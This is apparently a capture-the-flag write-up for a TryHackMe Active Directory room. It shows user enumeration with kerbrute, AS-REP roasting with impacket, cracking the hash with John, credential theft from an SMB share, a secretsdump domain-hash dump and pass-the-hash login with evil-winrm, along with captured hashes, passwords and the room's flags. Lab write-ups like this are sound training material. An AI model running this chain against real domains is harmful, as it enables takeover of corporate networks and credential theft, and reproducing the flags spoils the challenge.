@@ -1,0 +1,178 @@
+99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?
+
+
+AD: Basic Enumeration
+
+Command : enum4linux -a <Target_IP_Where_SMB_port_open_or_supported>
+
+enum4linux -a 10.211.11.10
+
+
+================================( Getting domain SID for 10.48.138.111 )================================
+
+Domain Name: THM-AD
+Domain Sid: S-1-5-21-3591857110-2884097990-301047963
+
+[+] Host is part of a domain (not a workgroup)
+
+
+
+================================( Getting domain SID for 10.211.11.10 )================================
+
+Domain Name: TRYHACKME
+Domain Sid: S-1-5-21-1966530601-3185510712-10604624
+
+[+] Host is part of a domain (not a workgroup)
+
+Note:
+
+Command: nmap -sV -sC <The_target_ip>
+
+
+Command: ./kerbrute_linux_amd64 userenum --dc <Target_IP_Address> -d <The_domain_name_with_Extension> <USERNAME_LIST>
+
+└─$ ./kerbrute_linux_amd64 userenum --dc 10.48.180.138 -d spookysec.local user.txt 
+
+
+After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASReproasting occurs when a user account has the privilege “Does not require Pre-Authentication” set. This means that the account does not need to provide valid identification(for example correct password or any password) before requesting a Kerberos Ticket on the specified user account.
+
+For this attack, we will use a Python code of impacket tool. The Python code name GetNPUsers.py
+
+First, let us collect the user's name which we got by brute-force attack by the kerbrute tools.
+
+Now let us use the impackets python program to find out which users Kerberos tickets (TGT) we can get without a password.
+
+Command : python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip <Target_IP> <Target_Domain>/ -no-pass -usersfile <the_selected_users_list>
+
+┌──(dhruv㉿dhruv)-[~/attacktive-directory]
+└─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.48.180.138 spookysec.local/ -no-pass -usersfile k-user.txt 
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:af2dc31c819d9fa1657bd667baffe58c$3f664247d3d16db85968d2288aaa114d0887c7c555a2ee71dccd75cb5edd4f80068a1dcd39287c8f96c9e578a7979b6ed8bcd3ebb919b4c19db01d27f1258ff237e7eb2232fb2490f0e0875469002f93c9f48fc7a71c62f0245d9df6a44be2475ac1c4914bacdbeb86f4a35633263e4bad87f2bdd0d41e7abcd3f84b4dd57156bb10b233562b0eee1461e3bbc10d89df58d16af78f8b02c82893d8669b1847d634fd7c2147db89cc69f7184aed6ed84cc6daed8437e2635411ee890a60771a6c0e4dd1b40a3a899374f0aaaa40f2bc2701622fdd1103bf1db150b6035d94d141944e80481ec8554e5d70db40dd41526f0fb5
+[-] User James doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+make Hash file
+
+Using John tools to break the hash. Given password list in the tryhackme is used.
+
+Command: john — wordlist=password.txt hash.txt
+
+
+└─$ john --wordlist=passwd.txt k-hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)     
+1g 0:00:00:00 DONE (2026-02-22 01:58) 50.00g/s 409600p/s 409600c/s 409600C/s horoscope..whitey
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+PASSWORD = 	management2005
+
+
+Task 6: Enumeration Back to the Basics:
+
+Command: smbclient -L //<IP_Address>/ -U <The_user_name>
+
+┌──(dhruv㉿dhruv)-[~/attacktive-directory]
+└─$ smbclient -L //10.48.180.138/ -U svc-admin
+
+Command : smbclient //<IP_Address>/<Target_Share> -U <Target_username>
+
+┌──(dhruv㉿dhruv)-[~/attacktive-directory]
+└─$ smbclient  //10.48.180.138/backup -U svc-admin 
+Password for [WORKGROUP\svc-admin]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat Apr  4 15:08:39 2020
+  ..                                  D        0  Sat Apr  4 15:08:39 2020
+  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020
+
+		8247551 blocks of size 4096. 3780065 blocks available
+smb: \> get backup_credentials.txt 
+getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+smb: \> 
+
+
+┌──(dhruv㉿dhruv)-[~/attacktive-directory]
+└─$ cat backup_credentials.txt | base64 -d
+
+backup@spookysec.local:backup2517860 
+
+
+ Task 7
+Domain Privilege Escalation Elevating Privileges within the Domain
+
+The backup@spookysec.local is a backup account of the Domain controller. We are assuming that in this account, all domains' password hashes are stored here. So, now we will use a Python code of the impacket tool that is named secretsdump.py. This code will retrieve and show us all the password hashes from the backup account that are stored here.. Exploiting this, we will effectively have full control over the AD Domain.
+
+
+┌──(dhruv㉿dhruv)-[~/attacktive-directory]
+└─$  python3 /usr/share/doc/python3-impacket/examples/secretsdump.py THM-AD/backup:backup2517860@10.48.141.28 -dc-ip 10.48.141.28
+
+We Got All Hashes including Administrator 
+
+Question: What method allowed us to dump NTDS.DIT?
+Answer: DRSUAPI
+
+
+we will use Evil-Winrm to access with the administrator hash that we got:
+
+# evil-winrm -i ‘10.10.253.74’ -u ‘Administrator’ -H ‘Hash’
+
+┌──(dhruv㉿dhruv)-[~/attacktive-directory]
+└─$ evil-winrm -i '10.48.141.28' -u 'Administrator' -H '0e0363213e37b94221497260b0bcb4fc'
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+thm-ad\administrator
+
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         4/4/2020  11:39 AM             32 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+TryHackMe{4ctiveD1rectoryM4st3r}
+
+
+*Evil-WinRM* PS C:\Users\svc-admin\Desktop> dir
+
+
+    Directory: C:\Users\svc-admin\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         4/4/2020  12:18 PM             28 user.txt.txt
+
+
+*Evil-WinRM* PS C:\Users\svc-admin\Desktop> type user.txt.txt
+TryHackMe{K3rb3r0s_Pr3_4uth}
+
+*Evil-WinRM* PS C:\Users\backup\Desktop> dir
+
+
+    Directory: C:\Users\backup\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         4/4/2020  12:19 PM             26 PrivEsc.txt
+
+
+*Evil-WinRM* PS C:\Users\backup\Desktop> type PrivEsc.txt
+TryHackMe{B4ckM3UpSc0tty!}
+
+
+
+
